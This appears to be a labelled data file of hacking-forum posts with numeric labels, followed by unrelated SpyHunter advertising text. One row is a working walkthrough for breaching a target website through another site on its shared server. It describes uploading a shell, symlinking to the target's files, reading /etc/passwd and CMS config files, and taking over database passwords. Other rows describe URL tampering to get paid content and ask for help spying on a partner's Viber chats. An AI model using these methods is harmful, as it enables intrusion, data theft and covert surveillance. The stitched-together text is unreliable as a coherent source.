2	Porn Website hacked no login required	""" 666, Just sharing my latest hack. I was tired of hacking where I needed to login. Hacking authorization page is just so much of a hassle specially when you come across MD5 hash which pretty much seems it would take ages to cipher.  Many of you dont know this, but I like the old traditional manual hacking it makes me think creatively and opens many doors for opportunity. Con for hacking manually without any tools is that it takes days sometimes to go through hundreds of directories and files to get what I need. Dont get me wrong I do use tools from time to time when the manual option has been exhausted. Without further ado..... Go to this link -->  CLICK HERE It will display all the videos and pictures without logging in. now this may not seem much until you start messing with the url so instead of /Jan..... remove everything after Jan since Jan is main directory and adding anything after that would might not work since each directory has a different sub directory. For your convenience I tested all these folder so you wont have to try and figure out which one works as you can see some of the are only 3 letters and some of the are full words. You can do: /Feb /March /April /May /June /July /September once you are in the directory you can just simply browse the sub folder and look for .jpg or .wmv files. Simply click on the file. I havent tested this on my Mac yet but all the videos and images have been tested on Windows OS and are working 100%. Once the video is downloaded just locate the video and play thats it.

0	Hack Non Vulnerable Sites	""" No DDoS. If your target website is not vulnerable, but you really want to hack it, you could do a IP lookup on this website: <!-- m --><a class=\""postlink\"" href=\""http://www.yougetsignal.com/tools/web-si...b-server/\"">http://www.yougetsignal.com/tools/web-si...b-server/</a><!-- m -->. How to get the IP of your target? Open up cmd (Run->cmd.exe or in Vista/7 press Start button and in the search bar enter cmd, then click it) and type ping targethost.com. Targethost.com is your target of course. You will see something like this: Pinging it-sec.biz [204.236.239.5] with 32 bytes of data:. In the brackets ([]) you can see the remote IP. Now enter it on the given website (above). You will get every website that is hosted on the server (same hosting). It makes you the job much easier, because the chances of hacking your target website are much bigger. You need to exploit only one of them to get to your target. If you managed to upload a shell to one of these websites, you can be 80% sure that you got your target, of course if it uses a SQL Database (Uses every Forum, Blog and other CMSs.)  After you uploaded a shell, upload this great php script coded by the UrduHack Team called symlink_urduhack.php Download here. It creates a symlink to your target website. Read more about symlink here. So you need to know what CMS your target is running and you need to know where the config file is located. For example in MyBB it is located in inc/config.php, in vBulletin it is located in includes/config.php. In the uploaded shell (not on your target host, on the website you did it) run a command: cat /etc/passwd This Unix command will display you the contents of the passwd file located in the etc folder. That means, every user on the system. If your targets website is forumpowered.com (example) you need to search in the /etc/passwd file something with forum or forumpow. If you find something like this, you can be sure it is your target. Use CTRL+F for fast search.  Once you found it, go to the shell home (to the directory where the shell was uploaded) and look for the path in the top. It will be something like this: /home/[namehere]/public_html/. Copy it to notepad, and replace your username with your targets one, forumpow (example). Open the uploaded file symlink_urduhack.php in your browser and paste there the path from notepad. It will create a symlink to the target website. Click the symlink0 hyperlink. If everything worked fine, you will be able to see all files on the target site. (Even read). But it does not work always, so lets create a direct symlink to the configuration file, so you can connect to the database and read the contents. Lets imagine, the target forum is running vBulletin and you need to get the content of the config files. You would enter this: /home/forumpow/public_html/includes/config.php. Would create a direct symlink to this file. Now you can use your SQL Manager on your shell to connect to the database. Now, maybe the most hard part is decrypting the passwords... You can follow this tut or you can simply update the password and salt with already cracked ones and login with it. """

1	Bypass a survey with NoScript	"""   Install the NoScript addon.  This browser add-on blocks scripts from running on websites. It wont work on all surveys, but it may work on some of them. The add-on is available for free for Firefox, but is not available for Chrome 1. Click the Firefox button and then click Add-ons. Search for “NoScript” in the search box, and then add NoScript Security Suite to Firefox. Block scripts to try to disable surveys. Depending on the way the survey was programmed, you may be able to use NoScript to bypass it. When you load the page, you will see a bar appear on the bottom of the page. Click the Options button to tweak what is being blocked and bypassed. 1.There is no guarantee that you will be able to bypass a survey with this method. If the file you are trying to access requires completing the survey, then you won’t be able to get the file.2.There are script blockers available for Chrome, but they aren’t as powerful as the NoScript tool for Firefox.   """
0	webhacking CTF challenge help	"""   Hi all, so recently Ive been participating in a local hacking challenge (something similar to the famous PicoCTF), and although Ive managed to solve most of the challenges, there are a few that still evade me. I was hoping you guys would be able to help me with this particular one: Objective: Get the flag from the following website:  http://103.10.24.99:5006 So what has to be done is, basically find a flag (The format is flag{some_words} ) from that website. Of course, Im not asking you to find the flag and tell it to me (After all, its a challenge     ) But Ive poured over this one for days to no avail. It would be great if one of you could put me on the right path, give me some hints and the like. Some observations Ive made: The most stand-out thing here is that you can upload an image on registering (just enter anything in the e-mail field, there is no verification). And on logging in the only thing you can do is view the image youve uploaded. I have tried most tutorials on uploading a shell disguised as an image file, but all my tries have failed so far. Also, clicking login without entering anything in the username & password field takes you to an account with an inkblot.jpg file uploaded in it. Could be worth a look. Advanced thanks for any help       """

1	BADLY NEEDING YOUR HELP GUYS	"""   I really need your help. Does anybody knows how to monitor or hack someones viber account? Because all the contacts are synced in viber so it would be easy for me to see who my boyfriend is flirting with.. I badly need to know because he locked his phone with a code. We are both using iphones so its really hard to open because it is password protected. Eveytime he goes to bathroom, he always bring his phone with him.. I really feel bad because we, girls, have womans instinct and that instinct is 90% right. :(  He actually did it one time. I just caught him while he was sleeping. We almost had a break up that time because of him cheating me. We didnt talk like weeks. And he came back to me running and I accepted him again with arms wide open. I didnt hesitate because I really love him. I just ask him not to do it again. Thats just months ago from now.. But then again, I am feeling now the same feeling I felt when I checked his phone that time. I feel that there is something wrong that is happening again. The problem is, he doesnt want me to ask and ask him about cheating. He feels hes mocked when I try to tell him that I love him so much and not to cheat on me again because I dont. Thats why I badly need your help guys. Is there a way even online to monitor his viber to see who he is chatting with? Without touching his phone? I know his number of course. I hope there is really a way. Because something is not right. Please help me. I want to open up my mind and I dont want it to happen again without me knowing because I am not really good in handling emotional pain. And if ever I caught him again, I will be the one who will walk out in his life because I dont want him to do that to me because I never cheat on him since the day I met him. :(  Thanks so much guys. I will really appreciate your help.             """

SpyHunter is a powerful, real-time anti-spyware application certified by West Coast Labs Checkmark Certification System and designed to assist the average computer user in protecting their PC from malicious threats. SpyHunter is automatically configured to give you optimal protection with limited interaction, so all you need to do is install it for immediate and ongoing protection. As malware continues to evolve and become more sophisticated to avoid detection by anti-spyware/anti-virus programs, SpyHunter responds with advanced technology to stay one step ahead of today¡¯s malware threats. SpyHunter offers additional customization capabilities to ensure every user is able to custom tailor SpyHunter to fit their specific needs. SpyHunter has the ability to detect and remove rootkits, which are used to stealth install rogue anti-spyware programs and other trojans. Rootkits use hidden and encrypted files and folders to avoid detection by traditional security software. SpyHunter newly integrated advanced rootkit detection technology allows it to perform an instant rootkit scan and promptly display a message upon detection. SpyHunter will then ask the user to reboot the computer and will remove the rootkit during the reboot process. In order to remove rootkits completely, Windows must be stopped upon boot because rootkits utilize other files that load and run with Windows. Therefore, to prevent rootkits from regenerating on a user¡¯s computer, we¡¯ve added a Compact OS into SpyHunter that allows your system to be booted without Windows so that the rootkit may be removed from your computer. If SpyHunter is not able to automatically remove a malware object, the Spyware HelpDesk, an interactive feature integrated into SpyHunter, allows our technicians to remotely analyze your machine and directly deliver a custom fix to specific malware problems that may be unique to your computer.
